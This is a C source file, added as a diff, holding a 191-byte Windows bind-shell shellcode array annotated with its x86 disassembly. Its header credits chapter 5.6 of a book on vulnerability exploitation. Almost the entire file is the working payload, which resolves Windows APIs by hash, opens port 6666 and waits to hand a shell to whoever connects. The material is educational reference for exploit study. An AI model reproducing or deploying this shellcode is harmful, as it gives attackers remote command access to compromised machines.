@@ -1,0 +1,132 @@
+/*****************************************************************************
+      To be the apostrophe which changed "Impossible" into "I'm possible"!
+		
+POC code of chapter 5.6 in book "Vulnerability Exploit and Analysis Technique"
+ 
+file name	: machine_code.txt
+author		: failwest  
+date		: 2006.12.11
+description	: 191 bytes bind shell, used to open port 6666 and wait for connection
+Noticed		: assume EAX point to the beginning of shellcode
+version		: 1.0
+E-mail		: failwest@gmail.com
+reference	:"Writing Small Shellcode", Dafydd Stuttard, NGS white paper, 2005.9.19
+		  http://www.nextgenss.com/research/papers/WritingSmallShellcode.pdf
+		
+	Only for educational purposes    enjoy the fun from exploiting :)
+******************************************************************************/
+
+
+
+char bindshell[]=
+"\x59"//            POP ECX
+"\x81\xC9\xD3\x62\x30\x20"//  OR ECX,203062D3
+"\x41"//             INC ECX
+"\x43"//             INC EBX
+"\x4D"//             DEC EBP
+"\x64\x99"//          CDQ                                      ;  Superfluous prefix
+"\x96"//             XCHG EAX,ESI
+"\x8D\x7E\xE8"//        LEA EDI,DWORD PTR DS:[ESI-18]
+"\x64\x8B\x5A\x30"//     MOV EBX,DWORD PTR FS:[EDX+30]
+"\x8B\x4B\x0C"//        MOV ECX,DWORD PTR DS:[EBX+C]
+"\x8B\x49\x1C"//        MOV ECX,DWORD PTR DS:[ECX+1C]
+"\x8B\x09"//           MOV ECX,DWORD PTR DS:[ECX]
+"\x8B\x69\x08"//        MOV EBP,DWORD PTR DS:[ECX+8]
+"\xB6\x03"//          MOV DH,3
+"\x2B\xE2"//           SUB ESP,EDX
+"\x66\xBA\x33\x32"//     MOV DX,3233
+"\x52"//             PUSH EDX
+"\x68\x77\x73\x32\x5F"//     PUSH 5F327377
+"\x54"//             PUSH ESP
+"\xAC"//             LODS BYTE PTR DS:[ESI]
+"\x3C\xD3"//           CMP AL,0D3
+"\x75\x06"//           JNZ SHORT bindshel.00401076
+"\x95"//             XCHG EAX,EBP
+"\xFF\x57\xF4"//        CALL DWORD PTR DS:[EDI-C]
+"\x95"//             XCHG EAX,EBP
+"\x57"//             PUSH EDI
+"\x60"//             PUSHAD
+"\x8B\x45\x3C"//        MOV EAX,DWORD PTR SS:[EBP+3C]
+"\x8B\x4C\x05\x78"//      MOV ECX,DWORD PTR SS:[EBP+EAX+78]
+"\x03\xCD"//           ADD ECX,EBP
+"\x8B\x59\x20"//        MOV EBX,DWORD PTR DS:[ECX+20]
+"\x03\xDD"//           ADD EBX,EBP
+"\x33\xFF"//           XOR EDI,EDI
+"\x47"//             INC EDI
+"\x8B\x34\xBB"//         MOV ESI,DWORD PTR DS:[EBX+EDI*4]
+"\x03\xF5"//           ADD ESI,EBP
+"\x99"//             CDQ
+"\xAC"//             LODS BYTE PTR DS:[ESI]
+"\x34\x71"//           XOR AL,71
+"\x2A\xD0"//           SUB DL,AL
+"\x3C\x71"//           CMP AL,71
+"\x75\xF7"//           JNZ SHORT bindshel.0040108E
+"\x3A\x54\x24\x1C"//      CMP DL,BYTE PTR SS:[ESP+1C]
+"\x75\xEA"//           JNZ SHORT bindshel.00401087
+"\x8B\x59\x24"//        MOV EBX,DWORD PTR DS:[ECX+24]
+"\x03\xDD"//           ADD EBX,EBP
+"\x66\x8B\x3C\x7B"//      MOV DI,WORD PTR DS:[EBX+EDI*2]
+"\x8B\x59\x1C"//        MOV EBX,DWORD PTR DS:[ECX+1C]
+"\x03\xDD"//           ADD EBX,EBP
+"\x03\x2C\xBB"//         ADD EBP,DWORD PTR DS:[EBX+EDI*4]
+"\x95"//             XCHG EAX,EBP
+"\x5F"//             POP EDI
+"\xAB"//             STOS DWORD PTR ES:[EDI]
+"\x57"//             PUSH EDI
+"\x61"//             POPAD
+"\x3B\xF7"//           CMP ESI,EDI
+"\x75\xB4"//           JNZ SHORT bindshel.0040106B
+"\x5E"//             POP ESI
+"\x54"//             PUSH ESP
+"\x6A\x02"//           PUSH 2
+"\xAD"//            LODS DWORD PTR DS:[ESI]
+"\xFF\xD0"//          CALL EAX
+"\x88\x46\x13"//        MOV BYTE PTR DS:[ESI+13],AL
+"\x8D\x48\x30"//        LEA ECX,DWORD PTR DS:[EAX+30]
+"\x8B\xFC"//           MOV EDI,ESP
+"\xF3\xAB"//          REP STOS DWORD PTR ES:[EDI]
+"\x40"//             INC EAX
+"\x50"//             PUSH EAX
+"\x40"//             INC EAX
+"\x50"//             PUSH EAX
+"\xAD"//             LODS DWORD PTR DS:[ESI]
+"\xFF\xD0"//           CALL EAX
+"\x95"//             XCHG EAX,EBP
+"\xB8\x02\xFF\x1A\x0A"//     MOV EAX,0A1AFF02
+"\x32\xE4"//           XOR AH,AH
+"\x50"//             PUSH EAX
+"\x54"//             PUSH ESP
+"\x55"//             PUSH EBP
+"\xAD"//             LODS DWORD PTR DS:[ESI]
+"\xFF\xD0"//           CALL EAX
+"\x85\xC0"//           TEST EAX,EAX
+"\x74\xF8"//           JE SHORT bindshel.004010D9
+"\xFE\x44\x24\x2D"//      INC BYTE PTR SS:[ESP+2D]
+"\x83\xEF\x6C"//        SUB EDI,6C
+"\xAB"//             STOS DWORD PTR ES:[EDI]
+"\xAB"//             STOS DWORD PTR ES:[EDI]
+"\xAB"//             STOS DWORD PTR ES:[EDI]
+"\x58"//             POP EAX
+"\x54"//             PUSH ESP
+"\x54"//             PUSH ESP
+"\x50"//             PUSH EAX
+"\x50"//             PUSH EAX
+"\x50"//             PUSH EAX
+"\x54"//             PUSH ESP
+"\x50"//             PUSH EAX
+"\x50"//             PUSH EAX
+"\x56"//             PUSH ESI
+"\x50"//            PUSH EAX
+"\xFF\x56\xE4"//        CALL DWORD PTR DS:[ESI-1C]
+"\xFF\x56\xE8"//        CALL DWORD PTR DS:[ESI-18]
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90"//             NOP
+"\x90";//             NOP
